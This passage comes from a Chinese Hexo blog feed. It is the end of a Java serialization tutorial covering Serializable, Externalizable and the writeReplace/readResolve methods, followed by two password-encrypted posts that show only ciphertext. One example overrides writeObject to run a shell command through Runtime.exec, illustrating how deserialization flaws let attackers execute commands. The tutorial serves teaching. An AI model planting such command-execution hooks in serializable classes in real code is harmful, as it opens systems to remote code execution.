class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize success!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The name is：&quot;</span>+user.getName());</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220829154016718.png" alt="image-20220829154016718"></p><p><code>java.io.Serializable</code>是一个空的接口，实现该接口的作用是用于<strong>标识该类可序列化</strong>。实现了<code>java.io.Serializable</code>接口的类原则上都需要产生一个<code>serialVersionUID</code>常量，反序列化时如果双方的<code>serialVersionUID</code>不一致会导致<code>InvalidClassException</code>异常。如果可序列化类未显示声明<code>serialVersionUID</code>，则序列化运行时将基于该类的各个方面计算默认<code>serialVersionUID</code>值。</p><p><code>ObjectOutputStream</code>序列化类对象的主要流程是首先判断序列化的类是否重写了<code>writeObject</code>方法，如果重写了就调用序列化对象自身的<code>writeObject</code>方法序列化。<code>ObjectInputStream</code>也是同理</p><p><strong>代码示例：</strong></p><p>创建<code>User</code>类并重写<code>writeObject</code>方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 先调用默认的writeObject方法</span></span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 以下为重写命令执行内容</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byte_arr_out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取命令执行结果流</span></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b))!= -<span class="number">1</span>)&#123;</span><br><span class="line">            byte_arr_out.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打印命令执行结果</span></span><br><span class="line">        System.out.println(byte_arr_out.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建<code>main</code>主类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 15:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        m.serialize();</span><br><span class="line">        m.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过writeObject方法将类对象进行序列化</span></span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize success!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The name is：&quot;</span>+user.getName());</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220829162019434.png" alt="image-20220829162019434"></p><p>运行后，除了正常对类对象的序列化与反序列化之外，还执行了我们重写的<code>writeObject</code>方法里的命令执行代码。</p><p>这也是反序列化漏洞的成因，如果输入的反序列化数据可以被用户控制，那么攻击者就可以构造恶意的 payload 执行系统命令。</p><h3 id="java-io-Externalizable"><a href="#java-io-Externalizable" class="headerlink" title="java.io.Externalizable"></a>java.io.Externalizable</h3><p><code>java.io.Externalizable</code>和<code>java.io.Serializable</code>几乎一样，只是<code>java.io.Externalizable</code>接口定义了<code>writeExternal</code>和<code>readExternal</code>方法需要序列化和反序列化的类实现，其余则和<code>java.io.Serializable</code>一样。</p><p>创建<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = (String) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>主类<code>Main</code>和前面一样保持不变<br><img src="images/image-20220829170100690.png" alt="image-20220829170100690"></p><h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><p>实现了<code>java.io.Serializable</code>接口的类，可以定义如下方法（反序列化魔术方法），这些方法将会在类序列化或反序列化过程中进行调用：</p><ul><li><code>private void writeObject(ObjectOutputStream out)</code>，自定义序列化</li><li><code>private void readObject(ObjectInputStream in)</code>，自定义反序列化</li><li><code>private void readObjectNoData()</code></li><li><code>protected Object writeReplace()</code></li><li><code>protected Object readResolve()</code></li></ul><p>有些方法在前面已经了解和使用过，说说<code>writeReplace()</code>和<code>readResolve()</code>方法</p><p><code>writeReplace()</code>：返回一个对象，该对象为实际被序列化的对象，在原对象序列化之前被调用，替换原对象成为待序列化对象</p><p><code>readResolve()</code>：返回一个对象，该对象为实际反序列化的结果对象，在原对象反序列化之后被调用，不影响原对象的反序列化过程，仅替换结果</p><p><strong>代码示例：</strong></p><p>创建<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">readResolve</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">User</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建<code>Admin</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 17:25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Admin</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">writeReplace</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建主类<code>Main</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 15:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        m.serialize();</span><br><span class="line">        m.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">Admin</span> <span class="variable">admin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Admin</span>();</span><br><span class="line">        <span class="comment">// 通过writeObject方法将类对象进行序列化</span></span><br><span class="line">        out.writeObject(admin);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize success!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The name is：&quot;</span>+user.getName());</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><img src="images/image-20220829180709106.png" alt="image-20220829180709106"></p><p>可以看到，在进行序列化的时候，本来序列化的是<code>Admin</code>类，由于<code>writeReplace()</code>方法的存在变成了序列化<code>User</code>类；而<code>User</code>类中定义的<code>name</code>为变量的值为<code>dotast</code>，在进行反序列化的时候，由于<code>readResolve()</code>方法的存在，<code>name</code>变量的值替换成了<code>admin</code>。</p>]]></content>
      
      
      <categories>
          
          <category> java security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>英语语法</title>
      <link href="/2021/09/21/%E8%8B%B1%E8%AF%AD%E8%AF%AD%E6%B3%95/"/>
      <url>/2021/09/21/%E8%8B%B1%E8%AF%AD%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6acc6678695414bea6c5a5fb234fd65e3ed6783b9dd55444c01dd80214364f34">f3cf9691fdf9b4e3a5779409e8d0ddc07faf4e97120846c8a0057e939e8aa60dd8c028df6af3240cffb0414d1a3fc035d57b1975a278642a1cd4d1078408ef24745feae511643fa5d6fc200c22eed19843454473be201621e5a89b34ff565711cb58caf8c49d4ecfde16c50de490166a76d891dbc870ff65fa82a975227b22415fb353ebfe572423e34800b3cc57527e129625ccce241d93c09c3066070c1ceb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 英语语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化编码绕过</title>
      <link href="/2021/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"/>
      <url>/2021/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7826a7d81c5f1f7804de8a95b0f2b4456e20d4f8125c9de22fc15db22964f0b8">48e22157b1ef105701eba779d55791b979258dd0da97b0ae81145800de45d00f925aebbf53382faaec7c93cc5fcb972f9d77b513e512111ede40a560744273a0ad5b2a4f5a9789b0f1cf3fba67f9b1ba89d95f4dbcf572c9ffa8964bc26a00cf00127b4f56b9992f189a1efdadd750e9f54c5711c43506ebda89851a7365e41ef40c35616442c1c88764d973b1d55c9ad44040f8fb5a8bc38882a9fd5952600d096bf28810a9a8b03253ac16f179139924630fa6ed8e62a614fdd8e6cdfb673c0a4b4928353fe4390050f1c8f2ffb4569f0280430f2c05356bd81f11a843b69e85795ca886b70f0a358a5762edb5538ce3b9291b4f2d1b0a5027534ec9fd4ec45b7cce17ce3dac9ea32fe45cb14ae2edf6e79b00fe6e9c2f5cd775a16dc40fc08cacd7a0251da3e07d5ceb86b98004964bad670c357ebce8df032e4f7bba836c00c44b7c18734694615789513c5d499c545683276fd56d0790be10c934ab0fbf6a342e8aa5e5cbcd8ceb81df381d2ae67137b6c64520e40328bd63e7bd0567b9f0d34a03952e3be5192a8f29082ee81be1242574fbf377b3c03be067ca01b056ec0fbbe02ec3068ba108c06f72910e07a80d3078df40c269b89a0806241d6fe466ecc0aed06a1476ca1d20c210f403a995328cb6907925290cd3bed22998168eb02281e29c96280f59b10daf490281eaff6e8aa001a8128274add7fdb6675ba49b18b8f54c62d82d61af248101b2b3c55c85702f22f3c9d00ef0d805dbe8ece9574c6f4717e0fab356ace530235d8f349ebcffaf7aff2ca78a2cece0bfcd948abb93e307b6bad92060c947b0cc803b2e77b30d82ebb7474954591f0c8865a7115d258094a045b88da7d7462d90bfe0dea9b72bf52cec5594157bc396bddfaa38a39f0802fe593e34672898952c9e43d8a74e759677c4facfcd39fccab6ebc68ea27368189482ce80c905166cd17cad36ff89010c9f42ccbece4bc1fbbfff6fdc14d06b76e3892202f7b7f82b9526a0578c980e365fd4258d7d73d679793be1add4ddebb1bd27cb17ceccfaf0c6da5708a0a797554265ebc174fae8ed04054d3f8acc0ee4ff253a489cc557006bd1459246c08fe04ef0df5d2244eb2bc8f301d4be9b51365fea75ebe4e876ad50f256bccf93ed7ab618e7adb50ae3a2b29357f7fc63a53b124c2c5d3291c6c9b2c0f86b2a4daf03af7878b3e00655dc2536c1c28194179c3b808dbafeff5960fc2fa7e161f1690e8c2e370eee1087f54d402ac87d72d6aa81e41ff10e7752c18bdf31cff081cd9942a87a64b5aec0008c00dd0c2f22cd7b0aa266434de517ee25e3d433da058c9f33e7225b088cabeb52865897530a171d4373951619330670ed8571d2e56401bf41b29dd4154c855bec816aa46426823a05c207e4c4899db8cd3a20df1358a59095960ce04575ab7f137bd3ef5cba1ace4c7d4cd37c50b23791442dde28e96dc05aca7d9080a1fa6940e524f2085a20805e9dc01949c2583052fae49570e1bd8b2dcd03810a0530d5adac3ec009143f174f14404b3e2701629a0bb30a653d29591e416ae4a9fbc8761316d30ff19e97c71bfe8bd99a5c8a6957b583415f690723d3b795362fa31f5b9519dcb181e2cea421c0ee4f3e74f1bdca2c3462e467a193524b40b6ae993ba4a67702f242af4df68066a8d1be606470a6f5265467044b70c907806714bbb7b21af92e8bbfdc7be0c3b8b13d02686d342ba8f102b8518a9b0e651997090244af7c91977327babe23a3e58234c46087b3ce5d08e1ad0a01837349a1198741dd6f6429d7c22397829e914c2a0262606c34a4c5d34430d17dc4d8d07ab32fb89b28b5485064207c650af85bfaac611fad6eda2ee66b2affa3d3b2f01538e4cb42a83745778bf303186f52f68cc1f82f1de465ebdef64231d67cb23388ba41d816c517017c91f98c49e4a5bdeb50aa71c9b935b46c8cd3a3591169909beb00f7853f413b04cd36450f6a885c4ad2bc6f97451a778c72557357968451bd31b0147ad77eb35a949bc83701ecb5695baed9cb9f155a2e910c513aad119da37997306d5ae4d5ffd2629fe1af9ce3e46f65624c34cd7a3205d12126f762bf9aa7341fd11109454b715d537f2756e20dd7a0579215d37aff372806b4f51c4e293f0abcd7358ed6ee738d4283f05d316baffe21762e4db8001c819afd274e11a9b837a9d4e1912961d9ec61eab5173c2cb8ad73dd8e35ceae009042525e80a4b5d45e4adcb80919a90e4f60c24fb55688b0eae527772c7717f593cc1caa731770f866abbf971263f03ee44f7f4eb78996a3c36b060ad38e93f4f0804d9dca0e40cf4e6e6e3bd94b90602f6941408dc9849e252dfe72474a917f4e9f376ac37d19ff80448ee80d61f103fb20e8f1687522b5ad156beec5bf40b30a96595b69063b06d4ecd5530b65c7917c84106bde2b3d5c7a37b5cd1d93ce8c16d4d02974df12987d264022a326b149a4b6ebfa35d37e7adfa75b54d9fb4fd2680b3981204e224e46158612a75f5a143eda9cc408ba229bb5639c4171b2050dc80eda7aefd0f1be8fafbefc010e8df859276c82ad4500d3e1040c5593e2c8e45b7cd96bb4d7f0d61acfc89bcb1a2b51b38ff4e27dead815109d5df1b929ed721f11b94b44d9e5ba77118e04464b40947917396edccc94d93413569ddf19fdb8a6e9e9e4121c12e9112b9f3e9003dff0c0c30b84e509bb0e729a6bfc382d649eb7f49c6ca60f5548f4f8f6a5302925da666cc733b7ed5d8f8